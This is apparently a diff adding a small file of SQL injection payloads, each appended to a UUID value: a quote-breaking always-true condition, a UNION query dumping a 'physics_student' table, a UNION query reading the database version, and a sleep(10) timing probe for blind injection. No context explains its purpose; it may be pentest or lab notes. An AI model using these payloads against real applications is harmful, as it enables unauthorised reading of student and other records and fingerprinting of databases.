@@ -1,0 +1,8 @@
+a96622f3-8db0-4266-b490-2ca553383238' OR 'a'='a
+
+a96622f3-8db0-4266-b490-2ca553383238' UNION select * from physics_student where 'a'='a
+
+a96622f3-8db0-4266-b490-2ca553383238' UNION select version(), null, null from dual where 'a'='a
+
+a96622f3-8db0-4266-b490-2ca553383238' UNION select sleep(10), null, null from dual where 'a'='a
+
